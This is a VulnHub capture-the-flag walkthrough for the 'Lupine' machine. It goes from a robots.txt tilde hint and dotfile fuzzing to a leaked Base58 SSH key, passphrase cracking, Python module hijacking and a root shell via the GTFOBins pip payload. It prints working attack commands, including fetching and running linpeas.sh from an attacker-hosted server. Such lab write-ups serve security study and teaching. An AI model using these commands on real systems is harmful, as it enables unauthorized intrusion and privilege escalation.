# Lupine (VulnHub) — CTF Writeup

**Platform:** VulnHub  
**Full Walkthrough (with screenshots):** [Read on Medium](https://medium.com/@olamideoyek/lupine-vulnhub-ctf-walkthrough-from-ssh-key-leak-to-root-via-python-hijacking-pip-3ea7c5097b6d)

---

## Overview

A Linux machine built around a multi-layered clue chain: an Apache `mod_userdir` misconfiguration led to a hidden directory, which contained a Base58-encoded SSH private key. After cracking the key's passphrase and working around a `libcrypto` parsing issue, SSH access was obtained. Privilege escalation involved **Python module hijacking** (abusing a writable `webbrowser.py` imported by a sudo-permitted script) followed by a classic **`pip` GTFOBins** exploit to reach root.

---

## Attack Chain Summary

```
Netdiscover → Nmap Scan → robots.txt Disallow Hint (~myfiles)
→ Custom Tilde Wordlist (sed) → Gobuster → /~secret Directory
→ FFUF Hidden Dotfile Fuzzing → .mysecret.txt (Base58-encoded SSH key)
→ CyberChef Decode → id_rsa Extracted
→ ssh2john + John the Ripper → Cracked Passphrase
→ libcrypto Parsing Fix (Python cryptography lib) → SSH Access (icex64)
→ sudo -l → heist.py (runs as arsene) → webbrowser.py Module Hijack
→ Shell as arsene → sudo pip (GTFOBins) → tty Fix → Root
```

---

## Step 1 — Host Discovery & Port Scanning

```bash
netdiscover
nmap <target-ip>
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP (Apache) |

The web server displayed a themed landing page (an Arsène Lupin sketch) with no obvious entry point.

---

## Step 2 — robots.txt Clue

```
GET /robots.txt
```

**Finding:** `Disallow: /~myfiles`

The **tilde (`~`) prefix** was the key clue — on Apache with `mod_userdir` enabled, this URL pattern exposes user home directories. Navigating to `/~myfiles/` returned a 404 — the directory name itself was a red herring, but the pattern was correct.

---

## Step 3 — Custom Tilde Wordlist via `sed`

A custom wordlist of `~`-prefixed directory names was generated using `sed` to brute-force other possible usernames/paths.

### Directory Fuzzing (Gobuster)
```bash
gobuster dir -u http://<target-ip>/ -w tilde_wordlist.txt
```

**Finding:** A directory named `/~secret` was discovered.

Navigating to it revealed a note from a user named **`icex64`**, hinting at a hidden SSH private key protected by a passphrase — supposedly strong enough to resist the small `fasttrack.txt` wordlist.

---

## Step 4 — Hidden File Discovery (FFUF)

Since the filename was unknown, `ffuf` was used with a leading dot (`.FUZZ`) to target hidden dotfiles specifically:

```bash
ffuf -w wordlist.txt -u http://<target-ip>/~secret/.FUZZ -e .txt,.bak,...
```

**Finding:** `.mysecret.txt` — containing an encrypted string.

---

## Step 5 — Decryption & SSH Key Extraction

### Identify the Encoding
The ciphertext was fed into **dCode's Cipher Identifier**, which returned **Base58** as the strongest match.

### Decode
The string was loaded into **CyberChef** and decoded using the `From Base58` operation, revealing a full **OpenSSH private key**.

```bash
chmod 600 id_rsa
```

### Extract Crackable Hash
```bash
ssh2john id_rsa > id_rsa.hash
```

### Crack the Passphrase
```bash
john --wordlist=fasttrack.txt id_rsa.hash
```

Despite the assumption that the passphrase was strong, it was successfully cracked using the small `fasttrack.txt` wordlist.

---

## Step 6 — SSH Access (with a `libcrypto` Detour)

### Initial Attempt
```bash
ssh -i id_rsa icex64@<target-ip>
# Result: Permission denied
```

The cracked passphrase alone wasn't enough — the login continued failing, and converting the key with `puttygen` (from `putty-tools`) also failed.

### Root Cause
The issue was a **`libcrypto`/OpenSSL parsing problem**, not an authentication failure — both `ssh` and `ssh-keygen` rely on `libcrypto`, which couldn't parse the key due to its **bcrypt-KDF encoding**.

### Fix — Python `cryptography` Library
```bash
pip install cryptography --break-system-packages
```

```python
python3 -c "
from cryptography.hazmat.primitives import serialization

with open('id_rsa', 'rb') as f:
    key_data = f.read()

private_key = serialization.load_ssh_private_key(
    key_data,
    password=b'yourpassphrase'
)

pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

with open('id_rsa_fixed', 'wb') as f:
    f.write(pem)

print('Converted successfully')
"
```

> Note: `--break-system-packages` bypasses the externally-managed-environment restriction for a quick one-off script — a virtual environment isn't strictly necessary here.

### Successful Login
```bash
chmod 600 id_rsa_fixed
ssh -i id_rsa_fixed icex64@<target-ip>
```

**Result:** Shell obtained as `icex64`.

---

## Step 7 — Sudo Enumeration & Python Module Hijacking

```bash
sudo -l
```

**Finding:** `icex64` could run a Python script (`/home/arsene/heist.py`) as user **`arsene`** with no password.

Inspecting `heist.py` revealed it imported a module named `webbrowser.py`.

### Locate the Module Path (LinPEAS)
```bash
# Attacker: host linpeas.sh
python3 -m http.server 80

# Target:
cd /tmp
wget http://<attacker-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS confirmed the full path of the writable `webbrowser.py` module (Python 3.9's standard library path).

### Hijack the Module
```bash
nano /usr/lib/python3.9/webbrowser.py
```

The module was modified to spawn `/bin/bash` when loaded — since `heist.py` imports `webbrowser` and runs with `arsene`'s privileges, importing the poisoned module executes the injected code.

### Trigger the Hijack
```bash
sudo -u arsene /usr/bin/python3 /home/arsene/heist.py
```

**Result:** Shell obtained as `arsene`.

---

## Step 8 — Privilege Escalation via `pip` (GTFOBins)

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/pip
```

A known GTFOBins exploit path for `pip`.

### Initial Attempt (GTFOBins Standard Payload)
```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\$(tty) >\$(tty) 2>\$(tty)')" > $TF/setup.py
sudo pip install $TF
```

This failed — the shell lacked a proper controlling terminal (common with non-interactive/reverse shells or terminal handling issues from tools like `script`/`tmux`).

### Fix — Hardcode the TTY Path
```bash
tty
# e.g. returns /dev/pts/0
```

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh </dev/pts/0 >/dev/pts/0 2>/dev/pts/0')" > $TF/setup.py
sudo pip install $TF
```

**Result: Root access achieved.**

```bash
cd /root
cat root.txt
```

> **Troubleshooting tip:** If `tty` itself returns "not a tty," the session isn't attached to a real terminal. Reattach with `script -qc /bin/bash /dev/null`, then re-run `tty` to get a valid path before retrying the exploit.

---

## Key Findings Summary

| Phase | Finding | Impact |
|-------|---------|--------|
| `robots.txt` | `~myfiles` disallow hint | Revealed `mod_userdir` tilde pattern |
| Gobuster (custom wordlist) | `/~secret` directory | Access to hidden note + key hint |
| FFUF (dotfile fuzzing) | `.mysecret.txt` | Base58-encoded SSH private key |
| CyberChef | Base58 decode | Raw OpenSSH private key recovered |
| John the Ripper | Cracked key passphrase | Enabled key usage despite strong-assumption |
| Python `cryptography` lib | Fixed `libcrypto` parsing issue | Enabled successful SSH login |
| `sudo -l` (icex64) | `heist.py` runnable as `arsene` | Entry point for module hijacking |
| `webbrowser.py` hijack | Writable stdlib module | Privilege escalation to `arsene` |
| `sudo -l` (arsene) | `pip` NOPASSWD | GTFOBins root exploit |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `netdiscover` / `nmap` | Host & service discovery |
| `gobuster` / `ffuf` | Directory and hidden-file fuzzing |
| dCode Cipher Identifier | Encoding detection |
| CyberChef | Base58 decoding |
| `ssh2john` / John the Ripper | SSH key passphrase cracking |
| Python `cryptography` library | Working around `libcrypto` parsing failure |
| LinPEAS | Locating writable Python module paths |
| GTFOBins | `pip` privilege escalation reference |

---

## Key Takeaways

- **`robots.txt`** disallow entries can leak URL *patterns* even when the literal path is a decoy — always test the pattern, not just the exact string.
- **Dotfile fuzzing** (`ffuf` with a leading `.FUZZ`) is essential when a directory is known but the filename isn't — default wordlists often miss hidden files.
- Not every SSH login failure is a wrong passphrase — **`libcrypto` parsing issues** with bcrypt-KDF-encoded keys are a known gotcha; Python's `cryptography` library is a reliable workaround.
- **Writable Python standard library modules** imported by privileged scripts are a serious and often-overlooked privilege escalation vector.
- GTFOBins payloads sometimes fail silently due to **missing a controlling TTY** — manually resolving and hardcoding the `tty` path is a practical fix.

---

> ⚠️ **Disclaimer:** This walkthrough was performed in an isolated lab environment for educational purposes only.
